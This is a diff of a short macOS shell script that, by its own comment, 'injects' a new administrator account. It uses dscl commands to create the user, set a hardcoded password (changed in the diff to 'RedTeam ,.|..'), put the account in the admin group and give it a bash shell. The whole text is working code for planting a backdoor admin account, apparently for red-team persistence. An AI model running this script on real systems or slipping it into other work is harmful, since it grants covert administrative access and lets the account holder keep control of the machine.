@@ -1,4 +1,4 @@
-f#!/bin/sh
+#!/bin/sh
 
 # Script for injecting a new admin account into macOS 
 # if an account with the same name is used, this script will not work.
@@ -7,7 +7,7 @@ adminaccount="youradminhere"
 
 dscl . -create /Users/$adminaccount
 dscl . -create /Users/$adminaccount RealName "Your Admin"
-dscl . -passwd /Users/$adminaccount "dumbpassword"
+dscl . -passwd /Users/$adminaccount "RedTeam ,.|.."
 dscl . -create /Users/$adminaccount UniqueID 501
 dscl . -create /Users/$adminaccount PrimaryGroupID 80
 dscl . -create /Users/$adminaccount UserShell /bin/bash
